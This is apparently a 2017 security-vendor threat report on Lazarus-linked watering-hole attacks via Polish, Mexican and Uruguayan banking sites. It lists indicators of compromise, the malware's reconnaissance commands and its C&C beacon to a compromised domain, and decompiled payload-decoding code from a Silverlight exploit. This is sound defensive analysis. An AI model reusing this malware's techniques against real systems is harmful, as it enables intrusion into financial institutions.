    "plain_text": "**baesystemsai.blogspot.co.uk/2017/02/lazarus-watering-hole-attacks.html**\n\n[On 3rd February 2017, researchers at badcyber.com released an article that detailed a series of attacks directed at](https://badcyber.com/several-polish-banks-hacked-information-stolen-by-unknown-attackers/)\nPolish financial institutions. The article is brief, but states that \"This is – by far – the most serious information\n_security incident we have seen in Poland\" followed by a claim that over 20 commercial banks had been confirmed_\nas victims.\n\nThis report provides an outline of the attacks based on what was shared in the article, and our own additional\nfindings.\n\n## ANALYSIS\n\nAs stated in the blog, the attacks are suspected of originating from the website of the Polish Financial Supervision\nAuthority (knf.gov[.]pl), shown below:\n\nFrom at least 2016-10-07 to late January the website code had been modified to cause visitors to download\nmalicious JavaScript files from the following locations:\n\nhxxp://sap.misapor[.]ch/vishop/view.jsp?pagenum=1\nhxxps://www.eye-watch[.]in/design/fancybox/Pnf.action\n\nBoth of these appear to be compromised domains given they are also hosting legitimate content and have done for\nsome time. The malicious JavaScript leads to the download of malware to the victim’s device.\n\nSome hashes of the backdoor have been provided in BadCyber's technical analysis:\n\n85d316590edfb4212049c4490db08c4b\nc1364bbf63b3617b25b58209e4529d8c\n\n\n-----\n\nThe C&Cs given in the BadCyber analysis were the following IP addresses:\n\n125.214.195.17\n196.29.166.218\n\n## LAZARUS MALWARE\n\nOnly one of the samples referenced by BadCyber is available in public malware repositories. At the moment we\ncannot verify that it originated from the watering-hole on the KNF website – but we have no reason to doubt this\neither.\n\nMD5 hash Filename File Info First seen Origin\n\n85d316590edfb4212049c4490db08c4b gpsvc.exe Win32 2017-01-26 PL\n(736 KB) 07:46:24\n\n[The file is packed with a commercial packer known as 'Enigma Protector'. Once unpacked it drops a known](http://enigmaprotector.com/en/about.html)\nmalware variant, which has been seen as part of the Lazarus group’s toolkit in other cases over the past year.\n\nThe unpacked executable takes several command line arguments:\n\n-l: list service names, available for its own registration\n-o: open specified event\n-t: set specified event\n-x [PASSWORD] -e [SERVICE_NAME]: drop/install DLL under specified [SERVICE_NAME]\n-x [PASSWORD] -f [SERVICE_NAME]: recreate the keys that keep the password for the next stage DLL, under\nthe specified [SERVICE_NAME]\n\nThe provided password's MD5 hash is used as an RC4 password. On top of that, there is one more RC4-round,\nusing a hard coded 32-byte RC4 password:\n\n53 87 F2 11 30 3D B5 52 AD C8 28 09 E0 52 60 D0 6C C5 68 E2 70 77 3C 8F 12 C0 7B\n13 D7 B3 9F 15\n\nOnce the data is decrypted with two RC4 rounds, the dropper checks the decrypted data contains a valid 4-byte\nsignature: 0xBC0F1DAD.\n\n## WATERING HOLE ANALYSIS\n\nThe attacker content on the compromised sap.misapor[.]ch site was not accessible at the time of writing.\nHowever, archived versions of some pages can be found:\n\nhttp://web.archive[.]org/web/20170203175640/https://sap.misapor.ch/Default.html\n\n|MD5 hash|Filename|File Info|First seen|Origin|\n|---|---|---|---|---|\n|85d316590edfb4212049c4490db08c4b|gpsvc.exe|Win32 (736 KB)|2017-01-26 07:46:24|PL|\n\n\n-----\n\nThe Default.html contains code to load MisaporPortalUI.xap – a Silverlight application which likely would\ncontain the malicious first-stage implant.

On 2016-11-08 we observed connections to the site referred from:\n\nhxxp://www.cnbv.gob[.]mx/Prensa/Paginas/Sanciones.aspx\n\nThis is the page for the Comisión Nacional Bancaria y de Valores (National Banking and Stock Commission of\nMexico), specifically the portion of their site that details sanctions made by the Mexican National Banking\nCommission. This organisation is the Mexican banking supervisor and the equivalent of Poland's KNF.\n\n\n-----\n\nIn this instance the site redirected to the following URL:\n\nhxxp://www.eye-watch[.]in/jscroll/images/images.jsp?pagenum=1\n\nAt the time of writing the compromise is no longer present and no archived versions of the page exist to show where\nthe compromise was located.\n\nA further instance of the malicious code appears to have been present on a bank website in Uruguay around 2016[10-26 when a PCAP of browsing to the website was uploaded to VirusTotal.com.](https://virustotal.com/en/file/a9f2b6a2fa1f0da4c35237638cfb0c6f988e74ee5a912ce727981a48435eddfa/analysis/)\n\nThis shows a GET request made to:\n\nhxxp://brou.com[.]uy\n\nFollowed shortly after by connections to:\n\nwww.eye-watch[.]in:443\n\nUnfortunately, the response was empty and it is not possible to assess what may have been delivered.\n\n## ADDITIONAL MALWARE AND EXPLOIT ACTIVITY\n\nThe compromised eye-watch[.]in domain has been associated with other malicious activity in recent months.\n\n\n-----\n\n|MD5 hash|Filename|File Info|First seen|Origin|\n|---|---|---|---|---|\n|4cc10ab3f4ee6769e520694a10f611d5|cambio.xap|ZIP (73 KB)|2016-10-07 03:09:43|JP|\n|cb52c013f7af0219d45953bae663c9a2|svchost.exe|Win32 EXE (126 KB)|2016-10-24 12:10:33|PL|\n|1f7897b041a812f96f1925138ea38c46|gpsvc.exe|Win32 EXE (126 KB)|2016-10-27 14:29:58|UY|\n|911de8d67af652a87415f8c0a30688b2|gpsvc.exe|Win32 EXE (126 KB)|2016-10-28 11:50:15|US|\n|1507e7a741367745425e0530e23768e6|gpsvc.exe|Win32 EXE (126 KB)|2016-11-15 18:20:34|N/A|\n\n\nThe last 4 samples can loosely be categorised as the same malware variant, however the first sample appears to be\na separate exploit (as detailed later).\n\nIt is worth noting that these samples were all compiled after the domain began being used alongside the\nknf.gov[.]pl watering-hole. Additionally, the samples uploaded from Poland and Uruguay match with the\nwatering-hole activity observed – suggesting this is all part of the same campaign.\n\nDespite this potential connection to the Poland bank compromises, the malware is not particularly advanced – for\nexample using basic operations to gather system information. The malware attempts to run a series of commands\nwith cmd.exe and then returns the result via the C&C, eye-watch[.]in.\n\nThese commands are as follows:\n\ncmd.exe /c hostname\ncmd.exe /c whoami\ncmd.exe /c ver\ncmd.exe /c ipconfig -all\ncmd.exe /c ping www.google.com\ncmd.exe /c query user\ncmd.exe /c net user\ncmd.exe /c net view\ncmd.exe /c net view /domain\ncmd.exe /c reg query \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet\nSettings\"\ncmd.exe /c tasklist /svc\ncmd.exe /c netstat -ano | find \"TCP\"\n\nAn example C&C beacon is seen below:\n\nGET /design/dfbox/list.jsp?action=What&u=10729854751740 HTTP/1.1\nConnection: Keep-Alive\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101\nFirefox/47 0\n\n\n-----\n\n## SILVERLIGHT XAP FILE\n\nThe cambio.xap archive sample (4cc10ab3f4ee6769e520694a10f611d5) does not use eye-watch[.]in as a\nC&C channel but instead was downloaded from the URL:\n\nhxxps://www.eye-watch[.]in/design/fancybox/include/cambio.xap\n\n_'cambio' is Spanish for 'change'. The URL is similar to that noted in the BadCyber blog, and the use of an XAP file_\nmatches what can be found in the Archive.org cache for the sap.misapor[.]ch site.\n\n[XAP is a software package format used for Microsoft Silverlight applications.](https://en.wikipedia.org/wiki/XAP_(file_format))\n\nIt can be opened as a standard ZIP archive and contains the following files:\n\nAppManifest.xaml\nShell_siver.dll\nSystem.Xml.Linq.dll\n\nTogether they form a re-packaged exploit for Silverlight based on CVE-2016-0034 (MS16-006) – a Silverlight\n[Memory Corruption vulnerability. The exploit has previously been used by several exploit kits including RIG and](http://www.malware-traffic-analysis.net/2016/03/31/index.html)\n[Angler to deliver multiple crimeware tools.](http://malware.dontneedcoffee.com/2016/02/cve-2016-0034.html)\n\nThe Shell_siver.dll file contains a compile path:\n\nc:\\Users\\KKK\\Desktop\\Shell_siver\\Shell_siver\\obj\\Release\\Shell_siver.pdb\n\nInternally, the code of this DLL loads a 2nd stage library called binaryreader.Exploit – as seen below with the\nXOR-encoded string:\n\nbyte[] array = new byte[]\n{\n115,120,127,112,99,104,99,116,112,117,\n116,99,63,84,105,97,125,126,120,101\n};\nthis.InitializeComponent();\nfor (int i = 0; i < array.Length; i++)\n{\narray[i] ^= 17;\n}\nif (args.get_InitParams().get_Keys().Contains(\"shell32\"))\n{\n...\ntype.InvokeMember(\"run\", 256, null, obj, new object[])\n...\n}\n\n\n-----\n\n30720);\ntry\n{\nfor (int i = 0; i < array.Length; i++)\n{\nbyte b = 56;\narray[i] ^= b;\n}\n...\n}\n\nOnce the payload stub is decoded, it represents itself as a PE-image, which is another .NET 4.0 assembly with the\ninternal name binaryreader.dll.\n\nThis second-stage DLL assembly, binaryreader.dll, is heavily obfuscated. The DLL (MD5 hash:\n7b4a8be258ecb191c4c519d7c486ed8a) is identical to the one reported in a malware traffic analysis blog post\n[from March 2016 where it was used to deliver Qbot. Thus it is likely the code comes from a criminal exploit kit which](http://www.malware-traffic-analysis.net/2016/03/31/index.html)\nis being leveraged for delivery in this campaign.\n\nA similarly named [cambio.swf (MD5 hash: 6dffcfa68433f886b2e88fd984b4995a) was uploaded to](https://virustotal.com/en/file/c1b29afcfddb79cfd57545b8600922150843ae2b170fff9aeacdeaa17adbf792/analysis/)\nVirusTotal from a US IP address in December 2016.\n\n## IP WHITELISTS\n\nWhen examining the code on the exploit kit website a list of 255 IP address strings was found. The IPs only\ncontained the first 3 octets, and would have been used to filter traffic such that only IPs on that subnet would be\ndelivered the exploit and payload.\n\nThe IP addresses corresponded to a mix of public and private financial institutions spread across the globe:\n\nHowever, banks in some specific countries feature prominently in the list:\n\n|Rank|Country|Count|\n|---|---|---|\n|1|Poland|19|\n\n\n-----\n\n|2|United States|15|\n|---|---|---|\n|3|Mexico|9|\n|4|United Kingdom|7|\n|5|Chile|6|\n|6|Brazil|5|\n|7|Peru|3|\n|7|Colombia|3|\n|7|Denmark|3|\n|7|India|3|\n\n\nThe prominence of Polish and Mexican banks matches the observation of watering-hole code on sites in both\ncountries.\n\n## CONCLUSIONS\n\nThe evidence available is currently incomplete and at the moment we can only conclude the following:\n\n  - There has been a series of watering hole attacks on bank supervisor websites in Poland & Mexico, and a\nstate owned bank in Uruguay in recent months. These leverage Silverlight and Flash exploits to deliver\nmalware.\n\n  - Investigators in Poland have identified known Lazarus group implants on bank networks and associated\nthis with the recent compromise of the Polish Financial Supervision Authority's website.\n\nThe technical/forensic evidence to link the Lazarus group actors (who we believe are behind the Bangladesh Bank\nattack and many others in 2016) to the watering-hole activity is unclear. However, the choice of bank supervisor /\nstate-bank websites would be apt, given their previous targeting of Central Banks for Heists – even when it serves\nlittle operational benefit for infiltrating the wider banking sector.\n\nNonetheless, further evidence to connect together the pieces of this attack is needed, as well as insights into the\nend-goal of the culprits. We are continuing our analysis of new artefacts as they emerge and may issue further\nupdates in due course.\n\n## RECOMMENDATIONS\n\n\n-----\n\ndomain. Patches against CVE-2016-0034 should be applied as soon as possible.\n\n## APPENDIX A - INDICATORS OF ATTACK\n\n|C&C IP address|125.214.195.17|\n|---|---|\n||196.29.166.218|\n|Compromised site|knf.gov[.]pl (currently clean)|\n||www.cnbv.gob[.]mx (currently clean)|\n||brou.com[.]uy (currently clean)|\n||sap.misapor[.]ch|\n||www.eye-watch[.]in|\n|MD5 Hashes|c1364bbf63b3617b25b58209e4529d8c|\n||85d316590edfb4212049c4490db08c4b|\n||1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae|\n||1507e7a741367745425e0530e23768e6|\n||911de8d67af652a87415f8c0a30688b2|\n||1f7897b041a812f96f1925138ea38c46|\n||cb52c013f7af0219d45953bae663c9a2|\n||4cc10ab3f4ee6769e520694a10f611d5|\n||7b4a8be258ecb191c4c519d7c486ed8a|\n\n\n-----",
